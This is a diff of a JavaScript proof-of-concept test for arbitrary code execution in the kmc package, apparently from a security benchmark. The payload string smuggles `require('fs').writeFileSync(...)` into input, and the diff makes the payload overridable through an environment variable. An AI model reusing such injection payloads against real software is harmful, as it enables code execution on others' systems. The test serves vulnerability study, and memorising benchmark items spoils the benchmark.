@@ -3,7 +3,7 @@ test("Arbitrary code execution in kmc", () => {
   const fs = require("fs");
   let kmc = require("kmc/lib");
   const path = "./kmc";
-  let payload = "red(); require('fs').writeFileSync('" + path + "',``); //";
+  let payload = process.env.SECBENCH_PAYLOAD || ("red(); require('fs').writeFileSync('") + path + "',``); //";
   data = {};
   file_exist = fs.existsSync(path);
   expect(file_exist).toBe(false);
